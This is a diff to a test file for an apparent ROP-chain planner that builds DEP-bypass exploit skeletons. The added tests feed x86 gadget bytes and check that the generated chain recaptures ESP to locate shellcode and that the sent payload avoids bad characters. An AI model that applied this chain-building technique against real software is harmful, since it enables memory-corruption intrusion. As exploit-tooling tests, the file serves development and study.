@@ -414,6 +414,28 @@ describe("dep_plan builds what it sends", () => {
     expect(measureLanding(undefined, undefined, () => undefined).how).toContain("not measured, no registers to read");
   });
 
+  // T10's shape: the field address sits in ecx and the only way out of it is `xchg eax, ecx`, which takes
+  // it away. The shellcode's address is a second capture of ESP plus the distance, as the reference does it.
+  // With `neg edx` the distance is popped negated; without it, it goes in as two clean dwords added in turn.
+  const RECAPTURE: Array<[number, number[]]> = [
+    [0x1501, [0x54, 0x58, 0xc3]], [0x1511, [0x5a, 0xc3]], [0x1521, [0x01, 0xd0, 0xc3]], [0x1531, [0x91, 0xc3]],
+    [0x1541, [0x89, 0x01, 0xc3]], [0x1551, [0x8b, 0x00, 0xc3]], [0x1561, [0x58, 0xc3]], [0x1571, [0xf7, 0xd8, 0xc3]],
+    [0x1581, [0x40, 0xc3]], [0x1591, [0x87, 0xcc, 0xc3]], [0x15a1, [0xc3]],
+  ];
+  const NEG_EDX: [number, number[]] = [0x15b1, [0xf7, 0xda, 0xc3]];
+
+  test.skipIf(!HAS_PYTHON).each([
+    ["neg edx", [...RECAPTURE, NEG_EDX], "c.rop(NEG_EDX)", "pop the distance negated, negate it and add it"],
+    ["no negate of edx", RECAPTURE, "c.patches.append(((part, len(c) + 1 + c.skip // 4), OFFSET + 4 * here, False))", "add the distance as two dwords"],
+  ])("with %s, the shellcode address comes from a second capture of ESP and the payload is clean", (_, code, line, how) => {
+    const output = plan("skeleton", code as Array<[number, number[]]>);
+    expect(output).toContain("1 hole(s) to fill");
+    expect(section(output, "=== [5/7]")).toContain(line as string);
+    expect(section(output, "=== [5/7]")).toContain(how as string);
+    const { sent, error } = send(output, 516);    expect(error).toBe("");
+    for (const bad of BAD) expect(sent.indexOf(bad), `0x${bad.toString(16)} at ${sent.indexOf(bad)}`).toBe(-1);
+  });
+
   // wbcore.dll's shape: the captured ESP's only add is `add esi, esi`, and the value register has no sub.
   const ADD_ESI_ESI: [number, number[]] = [0x13f1, [0x01, 0xf6, 0xc3]];
   const ADD_EDI_ECX: [number, number[]] = [0x1401, [0x01, 0xcf, 0xc3]];
@@ -427,7 +449,7 @@ describe("dep_plan builds what it sends", () => {
     expect(jobs).toContain("no: adds esi to itself, which doubles it and adds no distance");
     const chain = section(output, "=== [7/7]");
     expect(chain).toMatch(/c\.rop\(MOV_EDI_ESI\)\n {4}# edi -= 0x0000001C for field 1: ecx = 0xFFFFFFE4, then add\n {4}c\.rop\(POP_ECX, 0xFFFFFFE4\)/);
-    expect(section(output, "=== [5/7]")).toMatch(/def load_return\(c, field\):[^\n]*\n {4}c\.rop\(MOV_EDX_EDI\)\n[^\n]*\n {4}c\.rop\(POP_ECX, 0\)\n {4}c\.rop\(SUB_EDX_ECX\)\n {4}c\.rop\(MOV_EAX_EDX\)/);
+    expect(section(output, "=== [5/7]")).toMatch(/def load_return\(c, field\):[^\n]*\n {4}c\.rop\(MOV_EDX_EDI\)\n[^\n]*\n {4}c\.rop\(POP_ECX, 0\)[^\n]*\n {4}c\.rop\(SUB_EDX_ECX\)\n {4}c\.rop\(MOV_EAX_EDX\)/);
     expect(output).toContain("1 hole(s) to fill");
     const { sent, error } = send(output, 516);
     expect(error).toBe("");
